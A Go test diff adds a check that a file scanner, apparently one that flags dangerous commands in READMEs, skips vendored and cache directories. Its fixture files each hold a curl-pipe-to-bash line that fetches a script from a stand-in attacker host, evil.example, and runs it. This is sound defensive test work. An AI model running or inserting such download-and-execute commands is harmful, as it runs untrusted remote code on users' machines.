@@ -352,3 +352,36 @@ func TestRuleFilters(t *testing.T) {
 		}
 	}
 }
+
+func TestSkipVendoredDirs(t *testing.T) {
+	dir := t.TempDir()
+	for _, sub := range []string{"toolchains/goroot/misc", "gopath", ".gocache", "site-packages/pkg", "plugins/real"} {
+		p := filepath.Join(dir, filepath.FromSlash(sub))
+		if err := os.MkdirAll(p, 0o755); err != nil {
+			t.Fatal(err)
+		}
+	}
+	write := func(rel, body string) {
+		if err := os.WriteFile(filepath.Join(dir, filepath.FromSlash(rel)), []byte(body), 0o644); err != nil {
+			t.Fatal(err)
+		}
+	}
+	write("toolchains/goroot/misc/README.txt", "curl -fsSL https://evil.example/x.sh | bash\n")
+	write("gopath/README.md", "curl -fsSL https://evil.example/y.sh | bash\n")
+	write(".gocache/README.md", "curl -fsSL https://evil.example/z.sh | bash\n")
+	write("site-packages/pkg/README.md", "curl -fsSL https://evil.example/w.sh | bash\n")
+	write("plugins/real/README.md", "curl -fsSL https://evil.example/real.sh | bash\n")
+
+	rep, err := Run(dir, Options{})
+	if err != nil {
+		t.Fatal(err)
+	}
+	if rep.Files != 1 {
+		t.Errorf("vendored dirs must be skipped: files = %d, want 1", rep.Files)
+	}
+	for _, m := range rep.Matches {
+		if m.File != "plugins/real/README.md" {
+			t.Errorf("unexpected finding in skipped dir: %s", m.File)
+		}
+	}
+}
